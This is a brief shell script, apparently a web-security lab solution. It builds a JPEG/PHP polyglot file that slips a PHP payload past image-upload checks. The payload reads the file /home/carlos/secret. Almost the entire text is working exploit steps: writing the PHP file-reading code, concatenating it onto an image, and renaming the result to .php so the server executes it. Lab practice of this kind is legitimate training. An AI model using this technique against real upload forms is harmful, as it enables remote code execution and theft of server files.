# polyglot image is that is an image that also si a script
# for this example we just put an image and a script in one file
# and when sumbmitted at the end we get what we want.
#
# Step 1: Create a PHP script containing your code
echo "<?php echo file_get_contents('/home/carlos/secret'); ?>" > script.php

# Step 2: Combine the JPEG file with the PHP script
cat image.jpg script.php > polyglot.jpg

# Step 3: Change the file extension to .php (optional)
mv polyglot.jpg polyglot.php
